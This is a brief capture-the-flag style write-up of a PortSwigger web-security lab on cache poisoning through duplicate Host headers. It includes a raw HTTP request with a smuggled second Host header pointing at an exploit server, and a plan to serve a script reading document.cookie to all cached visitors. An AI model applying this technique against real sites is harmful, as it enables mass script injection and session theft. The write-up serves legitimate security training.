# Web cache poisoning via ambiguous requests — (PortSwigger — Practitioner)
**Date:** 2026-08-09
 
---
 
## Vulnerability / core concept
Web Cache Poisoning via HTTP Host Header Attack 

---


## Payload / key command
This web application uses caching to make the load easier for the server. However, it is vulnerable to ambigious requests that contain double `Host` headers. 

As this application uses the value of the Host header inside its body, altering it can lead to executing malicious attack:
```html
<script type="text/javascript" src="//0ad1006e030e911e81d311f70066007f.h1-web-security-academy.net/resources/js/tracking.js"></script>
```
We can change the value of this by sending double `Host` header request:
```bash
GET / HTTP/1.1
Host: 0ad1006e030e911e81d311f70066007f.h1-web-security-academy.net
Host: exploit-0aef00bf0361910b81c010b501580059.exploit-server.net
...
```
Now that we can change that value, we can add a `/resources/js/tracking.js` endpoint in our exploit server and add `alert(document.cookie` in its body. This way, when we poison the cache of this web application, it will serve the poisoned response to all users and our malicious script will execute.
